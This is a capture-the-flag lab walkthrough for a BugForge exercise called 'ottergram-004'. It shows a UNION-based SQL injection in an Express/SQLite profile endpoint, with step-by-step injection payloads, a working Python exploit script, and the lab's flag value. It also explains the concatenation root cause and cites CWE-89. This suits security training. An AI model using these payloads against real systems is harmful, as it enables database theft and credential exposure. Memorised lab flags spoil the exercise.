# ottergram-004 - BugForge Lab Walkthrough

**URL:** https://lab-1782807748292-kn3iar.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** UNION-based SQLi on `/api/profile/:username` path parameter - flag in admin password field
**Flag:** `bug{Z0KLxVNo1awFubWZwTFxvXoRMEJ1mALq}`

---

## Summary

Ottergram is a social media platform for otter photos. The public profile endpoint `/api/profile/:username` interpolates the username path parameter directly into a SQLite query without sanitisation. A UNION SELECT injection exfiltrates the admin user's password field, which contains the flag.

---

## Tech Stack

- React SPA frontend
- Express.js (Node.js)
- JWT (stored in localStorage)
- SQLite
- DB tables: `users`, `posts`, `likes`, `comments`

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Standard registration |
| `/api/login` | POST | No | Returns JWT |
| `/api/profile/:username` | GET | JWT | **Vulnerable** - username path param injected into SQL |
| `/api/admin/users` | GET | Admin JWT | Admin panel (not needed for exploit) |

---

## Discovery

### Step 1 - Enumerate the app

Register a user account and probe the API. The profile endpoint `/api/profile/a1` returns a JSON user object:

```json
{"user":{"id":5,"username":"a1","email":"a1@x.io","full_name":null,"bio":null,
"profile_picture":null,"role":"user"},"posts":[]}
```

### Step 2 - Detect the injection

Adding a single quote to the username causes a 404 ("User not found"), indicating the quote breaks the SQL WHERE clause:

```
GET /api/profile/a1'        → 404 User not found
GET /api/profile/a1''       → 404 User not found
```

An always-true condition returns the first user in the table instead of `a1`:

```
GET /api/profile/a1' OR '1'='1   → 200 (user: otter_lover, id=1)
```

The username is being interpolated directly into SQL with no parameterisation.

### Step 3 - Determine column count

The users table has 7 columns. Test by adding UNION SELECT with increasing NULL counts until a row is returned:

```
UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -   → 200 (7 cols confirmed)
```

Confirm column positions with string markers:

```
GET /api/profile/nonexistent' UNION SELECT 'COL0','COL1','COL2','COL3','COL4','COL5','COL6'-- -
```

Response:
```json
{"user":{"id":"COL0","username":"COL1","email":"COL2","full_name":"COL3",
"bio":"COL4","profile_picture":"COL5","role":"COL6"},"posts":[]}
```

The `bio` field maps to column 4 (index 4) - use it to exfiltrate data.

### Step 4 - Enumerate tables

```
GET /api/profile/nonexistent' UNION SELECT 1,'x','x',NULL,(SELECT group_concat(name) FROM sqlite_master WHERE type='table'),NULL,'user'-- -
```

Response bio: `users,sqlite_sequence,posts,likes,comments`

No dedicated flags table. The flag is likely stored in the `users` table.

### Step 5 - Dump admin password

The admin user (`id=2`, `username=admin`) was visible in public post comments. Dump their password field:

```
GET /api/profile/nonexistent' UNION SELECT 1,'x','x',NULL,(SELECT password FROM users WHERE id=2),NULL,'user'-- -
```

Response bio: `bug{Z0KLxVNo1awFubWZwTFxvXoRMEJ1mALq}`

---

## Exploit

```python
import urllib.request, json
from urllib.parse import quote

TARGET = "https://lab-1782807748292-kn3iar.labs-app.bugforge.io"

def api(path, body=None, tok=None):
    h = {"Content-Type": "application/json"}
    if tok: h["Authorization"] = "Bearer " + tok
    req = urllib.request.Request(TARGET + path,
        data=json.dumps(body).encode() if body else None,
        headers=h, method="POST" if body else "GET")
    return json.loads(urllib.request.urlopen(req).read())

tok = api("/api/login", {"username": "a1", "password": "Pass123!"})["token"]

payload = "nonexistent' UNION SELECT 1,'x','x',NULL,(SELECT password FROM users WHERE id=2),NULL,'user'-- -"
req = urllib.request.Request(
    TARGET + "/api/profile/" + quote(payload),
    headers={"Authorization": "Bearer " + tok})
result = json.loads(urllib.request.urlopen(req).read())
print(result["user"]["bio"])
# bug{Z0KLxVNo1awFubWZwTFxvXoRMEJ1mALq}
```

---

## Dead Ends

| Attempt | Why it failed |
|---------|--------------|
| SQLi on `GET /api/posts?search=` | Parameter appears unfiltered but search always returns all 5 posts regardless of input - no actual WHERE filtering applied |
| SQLi on `POST /api/login` | Query is parameterised, quotes returned 400 |
| Mass assignment (`role: "admin"`) | Server ignores the role field on registration |
| Admin default credentials | None of the common passwords worked |

---

## Root Cause

The profile route handler builds the SQL query by string concatenation:

```javascript
// Vulnerable pattern (approximate)
const user = await db.get(`SELECT * FROM users WHERE username = '${username}'`);
```

The `username` path parameter is taken from `req.params.username` and inserted directly without using a parameterised query or escaping. SQLite allows UNION injection to pivot to arbitrary table reads within the same database file.

---

## CWE / OWASP

- **CWE-89**: Improper Neutralisation of Special Elements used in an SQL Command (SQL Injection)
- **OWASP A03:2021** - Injection
